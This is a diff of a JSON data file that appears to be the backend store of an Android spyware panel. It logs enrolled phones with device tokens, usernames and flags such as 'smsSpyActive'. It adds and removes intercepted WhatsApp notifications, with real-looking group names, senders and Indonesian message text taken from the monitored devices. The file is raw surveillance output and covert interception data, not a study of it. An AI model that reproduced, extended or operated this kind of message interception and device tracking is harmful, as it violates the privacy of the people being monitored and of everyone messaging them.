@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776780162248,
+    "lastSeen": 1776780168408,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3586 pesan dari 21 chat",
+        "time": "21/04 21:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776780168953
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB byone/mabar ff 8a (3 pesan): exell",
+        "content": "💟 Stiker",
+        "time": "21/04 21:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776780168857
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3585 pesan dari 21 chat",
+        "time": "21/04 21:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776780165767
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB byone/mabar ff 8a (2 pesan): dika",
+        "content": "bodobodo",
+        "time": "21/04 21:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776780165683
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10296,38 +10328,6 @@
         "time": "21/04 20:35",
         "pkg": "com.whatsapp",
         "receivedAt": 1776778508335
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3589 pesan dari 22 chat",
-        "time": "21/04 20:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778507300
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (677 pesan): ~ Xell",
-        "content": "📷 Op 230\nSg omper \nFist ad 2 \nv tw 400\nEvo ad 2\nFull Spek pm\nIncuu utamaa jibunn\nproses redbin Traa yg redbin ad buktii",
-        "time": "21/04 20:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778507108
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3588 pesan dari 22 chat",
-        "time": "21/04 20:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778506709
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (675 pesan): ~ Xell",
-        "content": "📷 OP 305k\nFIST 1\nSG 2\nLOG REDBIN TRA YG REDBIN AD BUKTI",
-        "time": "21/04 20:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778505209
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776780159196,
+    "lastSeen": 1776780167333,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776780162250,
+    "lastSeen": 1776780168313,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
